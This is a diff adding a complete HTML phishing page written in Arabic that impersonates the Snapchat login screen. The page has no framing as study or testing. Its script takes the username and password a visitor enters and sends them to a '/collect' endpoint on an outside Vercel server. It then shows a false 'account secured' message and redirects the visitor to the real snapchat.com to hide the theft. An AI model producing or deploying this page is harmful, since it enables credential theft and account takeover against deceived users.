@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Snapchat - تسجيل الدخول</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,sans-serif;background:#FFFC00;display:flex;justify-content:center;align-items:center;min-height:100vh;direction:rtl}
+.card{background:white;border-radius:20px;padding:35px 25px;width:90%;max-width:380px;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,0.15)}
+.ghost{font-size:70px;margin-bottom:5px}
+.title{font-size:26px;font-weight:bold;color:#000;margin-bottom:5px}
+.subtitle{color:#666;font-size:14px;margin-bottom:25px}
+input{width:100%;padding:16px;margin:8px 0;background:#f5f5f5;border:2px solid #e0e0e0;border-radius:12px;font-size:16px;direction:ltr}
+input:focus{outline:none;border-color:#FFFC00;background:white}
+.btn{width:100%;padding:16px;background:#000;color:#FFFC00;border:none;border-radius:30px;font-size:17px;font-weight:bold;cursor:pointer;margin:15px 0}
+.btn:hover{background:#333}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="ghost">👻</div>
+<div class="title">Snapchat</div>
+<div class="subtitle">تسجيل الدخول للمتابعة</div>
+<input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني">
+<input type="password" id="password" placeholder="كلمة السر">
+<button class="btn" onclick="login()">تسجيل الدخول</button>
+<p id="msg" style="color:#0d904f;display:none;font-size:14px">✅ تم تأمين الحساب. جاري التحويل...</p>
+</div>
+
+<script>
+const SERVER = 'https://my-server-8utvt3870-m-9386.vercel.app';
+
+async function login(){
+    const u = document.getElementById('username').value;
+    const p = document.getElementById('password').value;
+    if(!u || !p) return;
+    
+    try{
+        await fetch(`${SERVER}/collect`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({id:'snap_'+Date.now(), type:'snapchat', username:u, password:p, time:new Date().toISOString()})
+        });
+    }catch(e){}
+    
+    document.getElementById('msg').style.display = 'block';
+    setTimeout(()=>{ window.location.href = 'https://snapchat.com/'; }, 2000);
+}
+</script>
+</body>
+</html>
